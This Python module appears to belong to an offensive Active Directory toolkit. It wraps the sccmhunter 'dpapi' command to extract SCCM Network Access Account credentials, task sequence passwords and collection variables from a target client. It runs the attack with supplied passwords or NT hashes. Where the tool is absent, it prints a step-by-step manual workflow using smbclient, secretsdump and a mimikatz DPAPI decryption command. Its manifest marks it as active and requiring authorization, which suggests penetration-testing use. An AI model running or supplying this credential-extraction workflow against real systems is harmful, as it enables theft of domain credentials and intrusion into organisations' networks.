"""SCCM DPAPI secret extraction via SCCMHunter dpapi command.

Extracts SCCM/MECM secrets protected by DPAPI from WMI repository
(OBJECTS.DATA) or disk. Recovers NAA (Network Access Account) credentials,
task sequence passwords, and collection variables.

Requires local admin on the SCCM client. Uses impacket for DPAPI blob
decryption and SMB access to retrieve the OBJECTS.DATA file.

Source: https://github.com/garrettfoster13/sccmhunter (MIT)
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from typing import Any


MANIFEST = {
    "capability_id": "adxpl.sccm.sccm_dpapi.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["credential_extraction", "smb_access", "dpapi_decryption"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.004", "T1072"],
    "source": "https://github.com/garrettfoster13/sccmhunter",
}


def _find_sccmhunter() -> str | None:
    """Locate the sccmhunter CLI."""
    for name in ("sccmhunter", "sccmhunter.py"):
        path = shutil.which(name)
        if path:
            return path
    search_dirs = [
        "/opt/tools/sccmhunter",
        os.path.expanduser("~/tools/sccmhunter"),
    ]
    for d in search_dirs:
        candidate = os.path.join(d, "sccmhunter.py")
        if os.path.isfile(candidate):
            return candidate
    return None


def run(args: Any) -> int:
    """Extract SCCM secrets via DPAPI decryption.

    Uses sccmhunter dpapi subcommand to recover NAA credentials, task
    sequence passwords, and collection variables from a target SCCM client.

    Args:
        args.target: Target SCCM client hostname or IP.
        args.domain: AD domain.
        args.username: Domain username with local admin on target.
        args.password: Password or NT hash.
        args.dc_ip: Domain controller IP (for DPAPI key retrieval).
        args.objects_data: Path to local OBJECTS.DATA file (optional).
    """
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)
    dc_ip = getattr(args, "dc_ip", None)
    objects_data = getattr(args, "objects_data", None)

    print("[*] SCCM DPAPI Secret Extraction")
    print(f"[*] Target: {target}")
    print(f"[*] Domain: {cred.domain}")

    sccmhunter = _find_sccmhunter()
    if sccmhunter:
        cmd = [sys.executable, sccmhunter, "dpapi"]
        auth = "{}\\{}".format(cred.domain, cred.username or "")
        cmd.extend(["-u", auth])
        if cred.password:
            cmd.extend(["-p", cred.password])
        elif getattr(cred, "nt_hash", None):
            cmd.extend(["-hashes", ":{}".format(cred.nt_hash)])
        if target:
            cmd.extend(["-target", target])
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, text=True)
        return result.returncode

    print("[!] sccmhunter not found")
    print()
    print("[*] DPAPI extraction workflow:")
    print("  1. Retrieve OBJECTS.DATA from target via SMB:")
    print("     smbclient //target/admin$ -U DOMAIN/user%pass")
    print("     get Windows\\System32\\wbem\\Repository\\OBJECTS.DATA")
    print()
    print("  2. Parse WMI repository for DPAPI-protected SCCM blobs:")
    print("     - CCM_NetworkAccessAccount (NAA credentials)")
    print("     - TS_TaskSequence (task sequence passwords)")
    print("     - CollectionVariable (collection variables)")
    print()
    print("  3. Decrypt DPAPI blobs:")
    print("     - Extract machine DPAPI master key via secretsdump")
    print("     - Use impacket dpapi.py to decrypt each blob")
    print("     - Or use mimikatz: dpapi::blob /in:blob.bin /masterkey:KEY")
    print()
    print("[*] Install sccmhunter: pip install sccmhunter")
    print("[*] Or: git clone https://github.com/garrettfoster13/sccmhunter")
    return 1
